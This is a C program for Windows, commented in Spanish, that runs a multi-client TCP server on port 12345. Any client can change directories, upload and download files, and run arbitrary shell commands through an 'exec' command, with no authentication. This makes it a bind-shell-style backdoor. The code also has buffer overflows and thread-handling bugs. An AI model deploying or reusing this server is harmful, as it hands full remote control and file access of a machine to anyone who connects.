#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <process.h>
#include <direct.h>
#include <dirent.h>
#include <io.h>
#include <windows.h>

#define MAX_CLIENTS 30
#define MAX_COMMAND_SIZE 1024
#define MAX_RESPONSE_SIZE 4096
#define MAX_BUFFER_SIZE 4096
#define MAX_FILE_NAME 256


void receiveFile(SOCKET clientSocket, const char* filename);
void sendFile(SOCKET clientSocket, const char* filename);




void handleClientCommand(SOCKET clientSocket, const char* command);
void executePowerShellCommand(SOCKET clientSocket, const char* command);

DWORD WINAPI ClientThread(LPVOID lpParam) {
    SOCKET clientSocket = *((SOCKET*)lpParam);
    char command[MAX_COMMAND_SIZE] = {0};

    while (1) {
        int bytesRead = recv(clientSocket, command, sizeof(command), 0);
        if (bytesRead <= 0) {
            printf("Cliente desconectado: %d\n", clientSocket);
            break;
        } else {
            printf("Comando recibido del cliente %d: %s\n", clientSocket, command);
            handleClientCommand(clientSocket, command);
        }
    }

    closesocket(clientSocket);
    return 0;
}


void handleClientCommand(SOCKET clientSocket, const char* command) {
    char response[MAX_RESPONSE_SIZE] = {0};

    if (strncmp(command, "cd ", 3) == 0) {
        // Comando "cd": Cambiar directorio
        const char* path = command + 3; // Ignorar el "cd " al principio del comando
        int result = _chdir(path); // Usar _chdir en lugar de chdir
        if (result == 0) {
            strcpy(response, "Directorio cambiado correctamente");
        } else {
            strcpy(response, "Error al cambiar el directorio");
        }
    } else if (strncmp(command, "put", 3) == 0) {
        // Recibir el nombre del archivo
        char fileName[MAX_FILE_NAME];
        sscanf(command, "put %s", fileName);

        // Llamar a la función para recibir el archivo del cliente
        receiveFile(clientSocket, fileName);
        printf("Archivo recibido exitosamente\n");
    } else if (strncmp(command, "get", 3) == 0) {
        // Recibir el nombre del archivo
        char fileName[MAX_FILE_NAME];
        sscanf(command, "get %s", fileName);

        // Llamar a la función para enviar el archivo al cliente
        sendFile(clientSocket, fileName);
        printf("Archivo enviado exitosamente\n");
    } else if (strncmp(command, "exec ", 5) == 0) {
        // Comando "exec": Ejecutar comando de PowerShell
        const char* powerShellCommand = command + 5; // Ignorar el "exec " al principio del comando
        executePowerShellCommand(clientSocket, powerShellCommand);
        return; // No enviar una respuesta inmediata, ya que la respuesta de PowerShell se enviará por separado
    } else if (strncmp(command, "ls", 2) == 0) {
        // Comando "ls": Listar archivos y directorios en el directorio actual
        DIR* dir;
        struct dirent* entry;

        dir = opendir(".");
        if (dir == NULL) {
            strcpy(response, "Error al abrir el directorio");
        } else {
            while ((entry = readdir(dir)) != NULL) {
                strcat(response, entry->d_name);
                strcat(response, "\n");
            }
            closedir(dir);
        }
    } else if (strcmp(command, "pwd") == 0) {
        char currentDir[MAX_COMMAND_SIZE];
        if (_getcwd(currentDir, sizeof(currentDir)) != NULL) {
            send(clientSocket, currentDir, strlen(currentDir), 0);
        } else {
            printf("Error al obtener el directorio actual\n");
            send(clientSocket, "Error al obtener el directorio actual", strlen("Error al obtener el directorio actual"), 0);
        }
    } else {
        strcpy(response, "Comando no reconocido");
    }

    // Enviar la respuesta al cliente
    send(clientSocket, response, strlen(response), 0);
}

/*void receiveFile(SOCKET clientSocket, const char* filename) {
    FILE* file = fopen(filename, "rb");  // Modo lectura binaria en lugar de escritura binaria
    if (file == NULL) {
        printf("Error al abrir el archivo para lectura: %s\n", filename);
        return;
    }
    char buffer[4096];
    int bytesRead;

    while ((bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
        fwrite(buffer, 1, bytesRead, file);
    }

    fclose(file);
}

void sendFile(SOCKET clientSocket, const char* filename) {
    FILE* file = fopen(filename, "rb");
    if (file == NULL) {
        printf("Error al abrir el archivo para lectura: %s\n", filename);
        return;
    }

    char buffer[4096];
    int bytesRead;

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        if (send(clientSocket, buffer, bytesRead, 0) == SOCKET_ERROR) {
            printf("Error al enviar el archivo al cliente %d\n", clientSocket);
            break;
        }
    }

    fclose(file);
}*/

void receiveFile(SOCKET clientSocket, const char* fileName) {
    FILE* file = fopen(fileName, "wb");
    if (file == NULL) {
        printf("Error al abrir el archivo para escritura\n");
        return;
    }

    char buffer[MAX_BUFFER_SIZE];
    int bytesRead;
    do {
        bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesRead < 0) {
            printf("Error al recibir el archivo del cliente\n");
            fclose(file);
            return;
        }
        fwrite(buffer, 1, bytesRead, file);
    } while (bytesRead == sizeof(buffer));

    fclose(file);
}

void sendFile(SOCKET clientSocket, const char* fileName) {
    FILE* file = fopen(fileName, "rb");
    if (file == NULL) {
        printf("Error al abrir el archivo para lectura\n");
        return;
    }

    char buffer[MAX_BUFFER_SIZE];
    int bytesRead;
    do {
        bytesRead = fread(buffer, 1, sizeof(buffer), file);
        if (bytesRead > 0) {
            if (send(clientSocket, buffer, bytesRead, 0) < 0) {
                printf("Error al enviar el archivo al cliente\n");
                fclose(file);
                return;
            }
        }
    } while (bytesRead > 0);

    fclose(file);
}

void executePowerShellCommand(SOCKET clientSocket, const char* command) {
    // Código para ejecutar el comando de PowerShell y enviar la salida al cliente
    // Aquí puedes usar cualquier método que te permita ejecutar comandos de PowerShell y obtener la salida
    
    // Ejemplo de código:
    FILE* pipe = _popen(command, "r");
    if (pipe == NULL) {
        printf("Error al ejecutar el comando de PowerShell: %s\n", command);
        return;
    }

    char buffer[4096];
    int bytesRead;

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), pipe)) > 0) {
        if (send(clientSocket, buffer, bytesRead, 0) == SOCKET_ERROR) {
            printf("Error al enviar la salida de PowerShell al cliente %d\n", clientSocket);
            break;
        }
    }

    _pclose(pipe);
}

int main() {
    WSADATA wsaData;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in serverAddress, clientAddress;
    unsigned short serverPort = 12345;

    // Inicializar Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Error al inicializar Winsock\n");
        return 1;
    }

    // Crear el socket del servidor
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        printf("Error al crear el socket del servidor\n");
        WSACleanup();
        return 1;
    }

    // Configurar la dirección del servidor
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = INADDR_ANY;
    serverAddress.sin_port = htons(serverPort);

    // Vincular el socket a la dirección del servidor
    if (bind(serverSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        printf("Error al vincular el socket a la dirección del servidor\n");
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    // Escuchar conexiones entrantes
    if (listen(serverSocket, 5) == SOCKET_ERROR) {
        printf("Error al escuchar conexiones entrantes\n");
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    printf("Servidor esperando conexiones en el puerto %d...\n", serverPort);

    while (1) {
        int clientAddressSize = sizeof(clientAddress);
        clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddress, &clientAddressSize);
        if (clientSocket == INVALID_SOCKET) {
            printf("Error al aceptar la conexión del cliente\n");
            closesocket(serverSocket);
            WSACleanup();
            return 1;
        }

        printf("Cliente conectado: %d\n", clientSocket);

        // Crear un hilo para manejar la comunicación con el cliente
        HANDLE clientThread = CreateThread(NULL, 0, ClientThread, &clientSocket, 0, NULL);
        if (clientThread == NULL) {
            printf("Error al crear el hilo para el cliente %d\n", clientSocket);
            closesocket(clientSocket);
        } else {
            // Liberar el hilo cuando haya terminado
            CloseHandle(clientThread);
        }
    }

    // Cerrar el socket del servidor
    closesocket(serverSocket);

    // Limpiar Winsock
    WSACleanup();

    return 0;
}